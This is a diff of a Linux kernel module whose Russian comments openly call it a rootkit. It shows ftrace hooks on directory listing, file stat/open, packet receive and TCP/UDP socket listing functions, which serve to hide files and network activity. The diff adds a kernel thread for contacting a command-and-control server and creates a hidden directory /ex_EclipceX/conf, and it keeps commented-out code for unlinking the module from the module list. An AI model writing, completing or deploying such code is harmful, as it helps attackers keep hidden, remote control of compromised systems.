@@ -2,8 +2,8 @@
 
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
-#include <linux/slab.h>			// работа с памятью (выделение освободждение и тп)
-#include <linux/uaccess.h>		// взаимодействие с пространством пользователя
+// #include <linux/slab.h>			// работа с памятью (выделение освободждение и тп)
+// #include <linux/uaccess.h>		// взаимодействие с пространством пользователя
 #include <linux/kprobes.h>
 #include <linux/version.h>
 #include <linux/module.h>
@@ -15,6 +15,7 @@
 
 
 #include "src/hooks.h"
+#include "src/c2/conn_serv.h"
 
 
 MODULE_LICENSE("GPL");
@@ -23,42 +24,10 @@ int debug_lvl = 0;
 module_param(debug_lvl, int, 0600);
 MODULE_PARM_DESC(debug_lvl, "Debug level 0/1");
 
-
-// -------- пока пусть тут ----------------
-
-// asmlinkage long (*real_sys_open)(struct pt_regs *regs) = NULL;
-
-struct ftrace_hook EX_hooks[] = {
-	HOOK("filldir64", ex_filldir64, &real_filldir64),
-	HOOK("filldir", ex_filldir, &real_filldir),
-
-
-	// SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),
-
-	// !sys_stat64 sys_lstat64 ??
-	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
-	SYS_HOOK("sys_lstat", ex_sys_lstat, &real_sys_lstat),
-	SYS_HOOK("sys_newstat", ex_sys_newstat, &real_sys_newstat),
-	SYS_HOOK("sys_newlstat", ex_sys_newlstat, &real_sys_newlstat),
-	SYS_HOOK("sys_newfstatat", ex_sys_newfstatat, &real_sys_newfstatat),
-	SYS_HOOK("sys_statx", ex_sys_statx, &real_sys_statx),
-
-	SYS_HOOK("sys_open", ex_sys_open, &real_sys_open),
-	SYS_HOOK("sys_openat", ex_sys_openat, &real_sys_openat),
-	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),
-
-	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
-
-	HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
-	HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
-	HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),
-
-	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
-	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
-	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
-	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
-};
-// ------------------------
+int fh_install_hook(struct ftrace_hook *hook);
+void fh_remove_hook(struct ftrace_hook *hook);
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
 
 // Функция поиска адреса системной функции
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
@@ -70,11 +39,14 @@ static unsigned long lookup_name(const char *name)
 	unsigned long retval;
 
 	if (register_kprobe(&kp) < 0) {
+		pr_info("error lookup_name register_kprobe\n");
 		return 0;
 	}
 
 	retval = (unsigned long) kp.addr;
+
 	unregister_kprobe(&kp);
+
 	return retval;
 }
 #else
@@ -199,6 +171,7 @@ int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
 	return 0;
 
 error:
+
 	while (i != 0) {
 		fh_remove_hook(&hooks[--i]);
 	}
@@ -225,61 +198,76 @@ void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 #endif
 
-// скрытие модуля
-// static struct list_head *prev_module;
-// static short hidden = 0;
+// создание диркетории и файлов вынести в отдельный файл 
+// создание дир 1 - путь родительской дир, 2 - название новой дир
 
-static struct task_struct *thread;  // Указатель на поток
-
-int create_ex_dir(void);
+bool create_ex_dir(char *path, char *dir_name);
+// !!! изменить структуру 
 // Создать директорию под руткит
-int create_ex_dir(void) {
+bool create_ex_dir(char *path, char *dir_name) {
 	struct path parent_path;
     struct dentry *dentry;
     struct mnt_idmap *idmap;
     int err;
-	char *dir_name = "ex_EclipceX";
 
-
-    err = kern_path("/", LOOKUP_DIRECTORY, &parent_path);
+	// Получаем путь к родительской директории
+    err = kern_path(path, LOOKUP_DIRECTORY, &parent_path);
     if (err)
-        return err;
+        return false;
 
+	// Ищем директорию по имени в родительской директории
     dentry = lookup_one_len(dir_name, parent_path.dentry, strlen(dir_name));
     if (IS_ERR(dentry)) {
         path_put(&parent_path);
-        return PTR_ERR(dentry);
+        return false;
+    }
+
+	// Проверяем, существует ли уже такая директория
+    if (dentry->d_inode) {
+        // Если inode уже существует, значит, директория уже есть
+        pr_info("Directory %s already exists in %s\n", dir_name, path);
+        dput(dentry);
+        path_put(&parent_path);
+        return true;  // Возвращаем 0, потому что директория уже существует
     }
 
     idmap = mnt_idmap(parent_path.mnt);  // получаем idmap для текущего mount namespace
 
-    err = vfs_mkdir(idmap, d_inode(parent_path.dentry), dentry, 0755);
+    if (vfs_mkdir(idmap, d_inode(parent_path.dentry), dentry, 0755)) {
+		dput(dentry);
+		path_put(&parent_path);
+		return false;
+	}
 
+	pr_info("Directory %s was created in %s\n", dir_name, path);
     dput(dentry);
     path_put(&parent_path);
-
-    return err;
+    return true;
 }
 
+
+static struct task_struct *c2_thread_ts;  // Указатель на поток
 
 static int ex_init(void)
 {
 	int err;
     pr_info("module init\n");
 
-	// скрывание модуля
-	// prev_module = THIS_MODULE->list.prev;
+	// скрыть модуль
 	// list_del(&THIS_MODULE->list);
-    // hidden = 1;
 
+	// Установка хуков
 	err = fh_install_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));
 	if (err)
 		return err;
 
-    // Создаем поток
-    // thread = kthread_run(my_thread_function, NULL, "my_kthread");
 
-	// err = create_ex_dir();
+    // Создание потока под взаимодействие с сервером 
+    c2_thread_ts = kthread_run(c2_thread, NULL, "c2_thread");
+
+	if (create_ex_dir("/", "ex_EclipceX")) {
+		create_ex_dir("/ex_EclipceX", "conf");
+	}
 
 	pr_info("module loaded\n");
 
@@ -294,12 +282,14 @@ static void ex_exit(void)
 	// list_add(&THIS_MODULE->list, prev_module);
     // hidden = 0;
 
+	// Удаление хуков
 	fh_remove_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));
 
-    // if (thread) {
-    //     printk(KERN_INFO "Ядро: остановка потока...\n");
-    //     kthread_stop(thread);
-    // }
+	// Завершение потока
+    if (c2_thread_ts) {
+        pr_info("остановка потока...\n");
+        kthread_stop(c2_thread_ts);
+    }
 
 	pr_info("module unloaded\n");
 }
